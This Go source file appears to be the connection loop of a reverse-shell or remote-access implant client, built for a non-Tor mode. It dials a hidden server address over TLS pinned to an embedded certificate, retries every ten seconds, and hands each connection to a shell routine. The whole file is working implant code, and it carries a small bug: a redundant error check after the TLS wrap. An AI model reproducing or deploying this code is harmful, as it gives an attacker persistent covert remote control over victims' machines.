// +build notor

package client

import (
	"crypto/tls"
	"crypto/x509"
	"net"
	"time"
)

func connect() (net.Conn, error) {
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		return nil, err
	}
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM([]byte(serverCert))

	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

func NetClient() {
	for {
		conn, err := connect()
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}
		c := new(connection)
		c.Conn = conn
		c.shell()
	}
}
